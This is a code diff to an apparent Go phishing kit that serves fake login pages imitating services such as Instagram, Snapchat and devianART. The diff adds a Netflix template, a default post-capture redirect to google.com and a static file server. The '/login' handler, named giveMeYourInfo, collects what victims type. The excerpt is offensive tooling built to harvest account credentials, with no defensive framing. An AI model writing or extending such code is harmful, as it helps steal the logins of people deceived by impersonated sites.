@@ -69,6 +69,7 @@ func menu() {
 	fmt.Println("[13] Badoo")
 	fmt.Println("[14] devianART")
 	fmt.Println("[15] Snapchat")
+	fmt.Println("[16] Netflix")
 	fmt.Println("")
 	fmt.Println("")
 
@@ -85,6 +86,9 @@ func menu() {
 	}
 	listenip = strings.TrimSpace(listenip)
 	redir = strings.TrimSpace(redir)
+	if redir == "" {
+		redir = "google.com"
+	}
 	bloatedChoiceHandler(choice)
 	loadTheWebMan(choice, listenip, redir)
 }
@@ -123,6 +127,8 @@ func bloatedChoiceHandler(choice string) string {
 		returns = "devianart"
 	case "15":
 		returns = "snapchat"
+	case "16":
+		returns = "netflix"
 	}
 	if returns == "default" {
 		log.Fatal("Please enter a valid option. (Example: '1' for Instagram)")
@@ -134,6 +140,7 @@ func loadTheWebMan(choice, listenip, redir string) {
 	choiceHandler := &ChoiceHandler{Choice: choice, Redir: redir}
 	http.HandleFunc("/login", choiceHandler.giveMeYourInfo)
 	http.HandleFunc("/", choiceHandler.epicTemplateLoader)
+	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./static"))))
 	fmt.Println("[*] HTTP listener started on " + listenip)
 	log.Fatal(http.ListenAndServe(listenip, nil))
 }
